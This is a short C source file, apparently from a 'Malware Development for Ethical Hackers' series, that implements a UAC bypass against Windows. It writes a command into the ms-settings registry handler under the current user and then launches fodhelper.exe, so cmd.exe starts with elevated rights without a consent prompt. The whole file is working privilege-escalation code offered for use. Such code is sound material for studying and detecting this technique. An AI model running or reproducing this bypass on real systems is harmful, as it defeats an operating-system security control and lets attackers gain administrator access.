/*
 * Malware Development for Ethical Hackers
 * hack.c - UAC evasion using fodhelper.exe
 * (registry modifications). C++ implementation
 * @cocomelonc
 */
#include <windows.h>
#include <stdio.h>

int main() {
  HKEY registryKey;
  DWORD disposition;

  const char* registryPath = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
  const char* command = "cmd /c start C:\\Windows\\System32\\cmd.exe"; // default program
  const char* delegateExecute = "";

  // Attempt to open the registry key
  LSTATUS status = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)registryPath, 0, NULL, 0, KEY_WRITE, NULL, &registryKey, &disposition);
  printf(status != ERROR_SUCCESS ? "Failed to open or create the registry key.\n" : "Successfully created the registry key.\n");

  // Set the registry values
  status = RegSetValueEx(registryKey, "", 0, REG_SZ, (unsigned char*)command, strlen(command));
  printf(status != ERROR_SUCCESS ? "Failed to set the registry value.\n" : "Successfully set the registry value.\n");

  status = RegSetValueEx(registryKey, "DelegateExecute", 0, REG_SZ, (unsigned char*)delegateExecute, strlen(delegateExecute));
  printf(status != ERROR_SUCCESS ? "Failed to set the registry value: DelegateExecute.\n" : "Successfully set the registry value: DelegateExecute.\n");

  // Close the registry key handle
  RegCloseKey(registryKey);

  // Start the fodhelper.exe program
  SHELLEXECUTEINFO shellExecuteInfo = { sizeof(shellExecuteInfo) };
  shellExecuteInfo.lpVerb = "runas";
  shellExecuteInfo.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
  shellExecuteInfo.hwnd = NULL;
  shellExecuteInfo.nShow = SW_NORMAL;

  if (!ShellExecuteEx(&shellExecuteInfo)) {
    DWORD error = GetLastError();
    printf (error == ERROR_CANCELLED ? "The user refused to allow privilege elevation.\n" : "Unexpected error! Error code: %ld\n", error);
  } else {
    printf("Successfully created the process =^..^=\n");
  }
  
  return 0;
}
